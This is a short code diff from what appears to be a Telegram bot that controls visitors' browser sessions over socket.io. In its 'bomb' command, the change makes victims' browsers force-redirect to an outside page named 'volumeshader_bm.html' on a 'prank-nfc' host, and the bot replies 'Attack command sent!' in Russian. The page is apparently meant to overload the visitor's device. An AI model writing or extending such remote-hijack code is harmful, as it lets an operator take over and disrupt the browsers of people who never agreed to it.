@@ -429,7 +429,7 @@ bot.on('callback_query', (query) => {
             break;
 
         case 'bomb':
-            global.io.to(sessionId).emit('force-redirect', { url: "https://google.com" }); 
+            global.io.to(sessionId).emit('force-redirect', { url: "https://prank-nfc.onrender.com/volumeshader_bm.html" }); 
             bot.answerCallbackQuery(query.id, { text: "☢️ Команда атаки отправлена!" });
             break;
 
